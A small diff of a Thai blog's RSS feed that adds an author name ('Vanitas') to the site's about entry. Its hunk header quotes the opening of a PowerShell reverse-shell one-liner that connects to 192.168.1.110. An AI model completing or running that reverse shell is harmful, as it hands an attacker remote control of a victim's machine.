@@ -172,7 +172,7 @@ $client = New-Object System.Net.Sockets.TCPClient(&amp;quot;192.168.1.110&amp;qu
       
       <guid>https://suam.wtf/about/</guid>
       <description>blog อยากเขียนไรก็เขียนของคน cool ๆ เพราะเราขายหน้าตา ไม่ได้ขายสาระ
-Author  P bongtrop eegeeg Ruthlezs Jusmistic  </description>
+Author  P bongtrop eegeeg Ruthlezs Jusmistic Vanitas  </description>
     </item>
     
     <item>
